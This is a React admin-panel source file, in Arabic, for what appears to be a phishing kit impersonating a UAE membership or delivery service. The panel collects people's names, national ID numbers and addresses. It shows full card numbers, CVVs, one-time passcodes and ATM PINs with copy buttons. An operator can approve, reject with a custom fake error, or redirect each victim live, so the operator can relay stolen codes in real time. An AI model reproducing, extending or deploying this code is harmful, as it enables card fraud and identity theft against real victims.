import { useState, useEffect, useRef, useCallback } from 'react'
import {
  adminLogin,
  adminGetStats,
  adminGetSessions,
  adminGetSession,
  adminSessionAction,
  adminRedirect,
  adminClearAll,
} from '../lib/api'

type Stage = 'card' | 'card_pending' | 'otp' | 'otp_pending' | 'atm' | 'atm_pending' | 'success' | 'failed'

interface PaymentSession {
  id: number
  sessionId: string
  fullName: string | null
  phoneNumber: string | null
  email: string | null
  emirate: string | null
  district: string | null
  membershipTier: string | null
  totalAmount: string | null
  idNumber: string | null
  addressEmirate: string | null
  addressDistrict: string | null
  addressStreet: string | null
  addressBuildingNumber: string | null
  cardName: string | null
  cardNumber: string | null
  cardNumberMasked: string | null
  cardExpiry: string | null
  cardCvv: string | null
  otpCode: string | null
  atmPin: string | null
  stage: Stage
  errorMessage: string | null
  clientIp: string | null
  userAgent: string | null
  statusRead: number | null
  redirectUrl: string | null
  createdAt: string
  updatedAt: string
}

interface Stats {
  total: number
  pending: number
  completed: number
  failed: number
  new: number
  registrations: number
}

const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card: { label: 'جديد', color: '#2563eb', bg: '#dbeafe' },
  card_pending: { label: 'انتظار دفع', color: '#d97706', bg: '#fef3c7' },
  otp: { label: 'انتظار OTP', color: '#b45309', bg: '#fef9c3' },
  otp_pending: { label: 'انتظار OTP', color: '#b45309', bg: '#fef9c3' },
  atm: { label: 'انتظار PIN', color: '#7c3aed', bg: '#ede9fe' },
  atm_pending: { label: 'انتظار PIN', color: '#7c3aed', bg: '#ede9fe' },
  success: { label: 'مكتمل', color: '#16a34a', bg: '#dcfce7' },
  failed: { label: 'فشل', color: '#dc2626', bg: '#fee2e2' },
}

function StageBadge({ stage }: { stage: Stage }) {
  const cfg = stageConfig[stage] || { label: stage, color: '#6b7280', bg: '#f3f4f6' }
  return (
    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold" style={{ color: cfg.color, backgroundColor: cfg.bg }}>
      {cfg.label}
    </span>
  )
}

function BookingDetailModal({
  session,
  onClose,
  onAction,
  onRedirect,
}: {
  session: PaymentSession
  onClose: () => void
  onAction: (action: 'pass' | 'denied' | 'completed', errorMsg?: string) => void
  onRedirect: (url: string) => void
}) {
  const [customError, setCustomError] = useState('تم رفض العملية. يرجى المحاولة مرة أخرى.')
  const [redirectUrl, setRedirectUrl] = useState('')
  const [copied, setCopied] = useState<string | null>(null)
  const isPending = session.stage.endsWith('_pending')

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text)
      setTimeout(() => setCopied(null), 2000)
    })
  }

  const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className="text-gray-800 text-sm font-medium text-left">{value || '-'}</span>
    </div>
  )

  const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-800 text-sm font-mono font-semibold">{value || '-'}</span>
        {value && (
          <button onClick={() => copyText(value)} className="text-gray-400 hover:text-blue-500 transition p-1 rounded" title="نسخ">
            {copied === value ? (
              <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            )}
          </button>
        )}
      </div>
    </div>
  )

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto shadow-2xl" onClick={e => e.stopPropagation()} dir="rtl">
        <div className="flex items-center justify-between p-5 border-b border-gray-200">
          <h3 className="text-gray-800 font-bold text-base">
            تفاصيل الحجز - <span className="text-blue-600 font-mono text-sm">{session.sessionId.slice(0, 16)}</span>
          </h3>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition">
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="p-5 space-y-5">
          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
              <svg className="w-4 h-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              بيانات العميل
            </h4>
            <div className="bg-gray-50 rounded-xl px-4">
              <InfoRow label="الاسم" value={session.fullName} />
              <InfoRow label="رقم الهوية" value={session.idNumber} />
              <InfoRow label="رقم الهاتف" value={session.phoneNumber} />
              <InfoRow label="البريد الإلكتروني" value={session.email} />
              <InfoRow label="الإمارة" value={session.emirate} />
              <InfoRow label="المنطقة" value={session.district} />
              <InfoRow label="نوع العضوية" value={session.membershipTier} />
              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} AED` : null} />
              <InfoRow label="IP العميل" value={session.clientIp} />
              <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
            </div>
          </div>

          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
              <svg className="w-4 h-4 text-indigo-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
              عنوان التوصيل
            </h4>
            <div className="bg-gray-50 rounded-xl px-4">
              <InfoRow label="إمارة التوصيل" value={session.addressEmirate} />
              <InfoRow label="منطقة التوصيل" value={session.addressDistrict} />
              <InfoRow label="الشارع" value={session.addressStreet} />
              <InfoRow label="رقم المبنى / المنزل" value={session.addressBuildingNumber} />
            </div>
          </div>

          {session.cardNumber && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                </svg>
                بيانات البطاقة
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="اسم الحامل" value={session.cardName} />
                <CopyRow label="رقم البطاقة" value={session.cardNumber} />
                <CopyRow label="تاريخ الانتهاء" value={session.cardExpiry} />
                <CopyRow label="CVV" value={session.cardCvv} />
              </div>
            </div>
          )}

          {session.otpCode && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                رمز OTP
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="رمز OTP" value={session.otpCode} />
              </div>
            </div>
          )}

          {session.atmPin && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-amber-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
                الرقم السري (PIN)
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="PIN" value={session.atmPin} />
              </div>
            </div>
          )}

          {isPending && (
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
              <h4 className="text-amber-700 font-bold text-sm mb-3">الإجراءات</h4>
              <div className="flex flex-wrap gap-2 mb-3">
                <button onClick={() => onAction('pass')} className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5">
                  قبول / التالي
                </button>
                <button onClick={() => onAction('denied', customError)} className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5">
                  رفض
                </button>
                <button onClick={() => onAction('completed')} className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5">
                  إتمام الدفع
                </button>
              </div>
              <div className="mb-3">
                <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                <input type="text" value={customError} onChange={e => setCustomError(e.target.value)} className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white" />
              </div>
              <div>
                <label className="text-gray-600 text-xs mb-1 block">إعادة توجيه العميل إلى:</label>
                <div className="flex gap-2">
                  <input type="text" value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)} placeholder="https://..." className="flex-1 border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white" />
                  <button onClick={() => onRedirect(redirectUrl)} disabled={!redirectUrl} className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 text-white px-3 py-2 rounded-lg text-sm font-bold transition">
                    توجيه
                  </button>
                </div>
              </div>
            </div>
          )}

          <div className="bg-gray-50 rounded-xl px-4">
            <InfoRow label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString('ar-AE')} />
            <InfoRow label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString('ar-AE')} />
          </div>
        </div>
      </div>
    </div>
  )
}

export default function AdminPanel({ onBackToHome }: { onBackToHome: () => void }) {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem('adminToken'))
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loginError, setLoginError] = useState('')
  const [loginLoading, setLoginLoading] = useState(false)
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null)
  const [searchQuery, setSearchQuery] = useState('')
  const [notification, setNotification] = useState<{ message: string; type: 'success' | 'error' | 'info' } | null>(null)
  const [stats, setStats] = useState<Stats>({ total: 0, pending: 0, completed: 0, failed: 0, new: 0, registrations: 0 })
  const [allSessions, setAllSessions] = useState<PaymentSession[]>([])
  const [loading, setLoading] = useState(false)
  const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null)

  const showNotif = (message: string, type: 'success' | 'error' | 'info') => {
    setNotification({ message, type })
    if (notifTimer.current) clearTimeout(notifTimer.current)
    notifTimer.current = setTimeout(() => setNotification(null), 4000)
  }

  // Load sessions from API
  const loadSessions = useCallback(async () => {
    if (!token) return
    setLoading(true)
    try {
      const sessions = await adminGetSessions()
      setAllSessions(sessions || [])
    } catch (err: any) {
      showNotif('فشل في تحميل البيانات: ' + err.message, 'error')
    } finally {
      setLoading(false)
    }
  }, [token])

  // Load stats
  const loadStats = useCallback(async () => {
    if (!token) return
    try {
      const data = await adminGetStats()
      setStats(data)
    } catch (err: any) {
      console.error('Failed to load stats:', err)
    }
  }, [token])

  // Poll for updates every 3 seconds
  useEffect(() => {
    if (!token) return
    loadSessions()
    loadStats()
    const interval = setInterval(() => {
      loadSessions()
      loadStats()
    }, 3000)
    return () => clearInterval(interval)
  }, [token, loadSessions, loadStats])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password) return
    setLoginLoading(true)
    try {
      const result = await adminLogin(password)
      const newToken = result.token
      localStorage.setItem('adminToken', newToken)
      setToken(newToken)
      setLoginError('')
    } catch (err: any) {
      setLoginError(err.message || 'كلمة المرور غير صحيحة')
    } finally {
      setLoginLoading(false)
    }
  }

  const handleLogout = () => {
    localStorage.removeItem('adminToken')
    setToken(null)
  }

  const handleAction = async (action: 'pass' | 'denied' | 'completed', errorMsg?: string) => {
    if (!selectedSession) return
    try {
      const result = await adminSessionAction(selectedSession.sessionId, action, errorMsg)
      showNotif(`تم تنفيذ: ${action === 'pass' ? 'قبول' : action === 'denied' ? 'رفض' : 'إتمام'}`, 'success')
      setSelectedSession(null)
      loadSessions()
      loadStats()
    } catch (err: any) {
      showNotif('فشل: ' + err.message, 'error')
    }
  }

  const handleRedirect = async (url: string) => {
    if (!selectedSession || !url) return
    try {
      await adminRedirect(selectedSession.sessionId, url)
      showNotif('تم توجيه العميل بنجاح', 'success')
    } catch (err: any) {
      showNotif('فشل التوجيه: ' + err.message, 'error')
    }
  }

  const handleClearAll = async () => {
    if (!confirm('هل أنت متأكد من حذف جميع السجلات؟ هذا الإجراء لا يمكن التراجع عنه.')) return
    try {
      await adminClearAll()
      showNotif('تم حذف جميع السجلات', 'success')
      loadSessions()
      loadStats()
    } catch (err: any) {
      showNotif('فشل: ' + err.message, 'error')
    }
  }

  // Filter sessions
  const filteredSessions = allSessions.filter(s => {
    if (!searchQuery) return true
    const q = searchQuery.toLowerCase()
    return (
      (s.sessionId || '').toLowerCase().includes(q) ||
      (s.fullName || '').toLowerCase().includes(q) ||
      (s.email || '').toLowerCase().includes(q) ||
      (s.phoneNumber || '').toLowerCase().includes(q) ||
      (s.idNumber || '').toLowerCase().includes(q)
    )
  })

  // Login page
  if (!token) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{ background: 'linear-gradient(135deg, #1a2744 0%, #0f1f3d 100%)' }} dir="rtl">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <svg className="w-9 h-9 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z" />
              </svg>
            </div>
            <h2 className="text-gray-800 text-xl font-bold">مؤسسة فزعة</h2>
            <p className="text-gray-500 text-sm mt-1">لوحة التحكم الإدارية</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="text-gray-600 text-sm block mb-1.5 font-medium">كلمة المرور</label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100"
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>
              </div>
            </div>

            {loginError && (
              <div className="bg-red-50 border border-red-200 rounded-xl px-4 py-2.5">
                <p className="text-red-600 text-sm">{loginError}</p>
              </div>
            )}

            <button type="submit" disabled={loginLoading} className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-md">
              {loginLoading ? 'جاري التحقق...' : 'تسجيل الدخول'}
            </button>
          </form>

          <button onClick={onBackToHome} className="mt-4 w-full text-center text-gray-500 text-sm hover:text-blue-600 transition">
            العودة للصفحة الرئيسية
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {notification && (
        <div className={`fixed top-4 right-4 z-50 rounded-xl px-4 py-3 shadow-lg flex items-center gap-3 min-w-64 text-white text-sm font-medium ${notification.type === 'success' ? 'bg-green-600' : notification.type === 'error' ? 'bg-red-600' : 'bg-blue-600'}`}>
          <span>{notification.type === 'success' ? '✅' : notification.type === 'error' ? '❌' : 'ℹ️'}</span>
          <p>{notification.message}</p>
          <button onClick={() => setNotification(null)} className="mr-auto opacity-80 hover:opacity-100">✕</button>
        </div>
      )}

      {selectedSession && (
        <BookingDetailModal
          session={selectedSession}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
          onRedirect={handleRedirect}
        />
      )}

      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow">
            <svg className="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z" />
            </svg>
          </div>
          <div>
            <h1 className="text-gray-800 font-bold text-sm leading-tight">مؤسسة فزعة</h1>
            <p className="text-blue-600 text-xs font-semibold">لوحة التحكم</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
            <span className="text-green-600 text-xs font-medium">متصل</span>
          </div>

          <button onClick={() => { loadSessions(); loadStats(); }} className="w-8 h-8 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center transition" title="تحديث">
            <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </button>

          <button onClick={handleClearAll} className="flex items-center gap-1.5 bg-orange-500 hover:bg-orange-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition">
            مسح الكل
          </button>

          <button onClick={handleLogout} className="flex items-center gap-1.5 bg-red-500 hover:bg-red-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition">
            خروج
          </button>
        </div>
      </header>

      <div className="px-6 py-5">
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
          {[
            { label: 'إجمالي الطلبات', value: stats.total, icon: '📋', color: 'text-blue-600', bg: 'bg-blue-50' },
            { label: 'التسجيلات', value: stats.registrations, icon: '📝', color: 'text-indigo-600', bg: 'bg-indigo-50' },
            { label: 'قيد المعالجة', value: stats.pending, icon: '⏳', color: 'text-yellow-600', bg: 'bg-yellow-50' },
            { label: 'مكتملة', value: stats.completed, icon: '✅', color: 'text-green-600', bg: 'bg-green-50' },
            { label: 'طلبات جديدة', value: stats.new, icon: '🔔', color: 'text-orange-600', bg: 'bg-orange-50' },
          ].map((stat, i) => (
            <div key={i} className="bg-white rounded-xl shadow-sm border border-gray-100 p-4 flex items-center gap-3">
              <div className={`w-12 h-12 ${stat.bg} ${stat.color} rounded-xl flex items-center justify-center flex-shrink-0 text-xl`}>
                {stat.icon}
              </div>
              <div>
                <div className="text-2xl font-bold text-gray-800">{stat.value}</div>
                <div className="text-gray-500 text-xs leading-tight">{stat.label}</div>
              </div>
            </div>
          ))}
        </div>

        <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="flex items-center justify-between px-5 py-4 border-b border-gray-100">
            <h2 className="text-gray-800 font-bold text-base">قائمة الطلبات</h2>
            <div className="flex items-center gap-2">
              <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="border border-gray-200 rounded-lg px-3 py-1.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 w-48" />
            </div>
          </div>

          {loading && allSessions.length === 0 ? (
            <div className="text-center py-16 text-gray-400">
              <div className="inline-block animate-spin rounded-full h-8 w-8 border-4 border-gray-300 border-t-blue-600 mb-3"></div>
              <p>جاري التحميل...</p>
            </div>
          ) : filteredSessions.length === 0 ? (
            <div className="text-center py-16 text-gray-400">
              <svg className="w-12 h-12 mx-auto mb-3 text-gray-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
              </svg>
              لا توجد طلبات
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-gray-50 border-b border-gray-100">
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الاسم</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden lg:table-cell">رقم الهوية</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">البريد الإلكتروني</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">رقم الهاتف</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">الإمارة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">نوع العضوية</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">المبلغ</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden lg:table-cell">التاريخ</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الحالة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredSessions.map((s, idx) => (
                    <tr key={s.sessionId} className={`border-b border-gray-50 hover:bg-blue-50/30 transition ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/30'}`}>
                      <td className="px-4 py-3 text-gray-800 font-medium">{s.fullName || '-'}</td>
                      <td className="px-4 py-3 text-gray-600 text-xs hidden lg:table-cell">{s.idNumber || '-'}</td>
                      <td className="px-4 py-3 text-gray-600 text-xs">{s.email || '-'}</td>
                      <td className="px-4 py-3 text-gray-600 text-xs">{s.phoneNumber || '-'}</td>
                      <td className="px-4 py-3 text-gray-700 font-medium hidden md:table-cell">{s.emirate || '-'}</td>
                      <td className="px-4 py-3 hidden md:table-cell">
                        <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${s.membershipTier === 'platinum' ? 'bg-purple-100 text-purple-700' : s.membershipTier === 'gold' ? 'bg-yellow-100 text-yellow-700' : s.membershipTier === 'silver' ? 'bg-gray-100 text-gray-600' : 'bg-gray-100 text-gray-500'}`}>
                          {s.membershipTier || '-'}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <span className="text-blue-600 text-xs font-semibold">{s.totalAmount || '15'} AED</span>
                      </td>
                      <td className="px-4 py-3 text-gray-500 text-xs hidden lg:table-cell">{new Date(s.createdAt).toLocaleDateString('ar-AE')}</td>
                      <td className="px-4 py-3"><StageBadge stage={s.stage} /></td>
                      <td className="px-4 py-3">
                        <button onClick={() => setSelectedSession(s)} className="flex items-center gap-1 bg-blue-600 hover:bg-blue-700 text-white px-2.5 py-1.5 rounded-lg text-xs font-medium transition">
                          تفاصيل
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
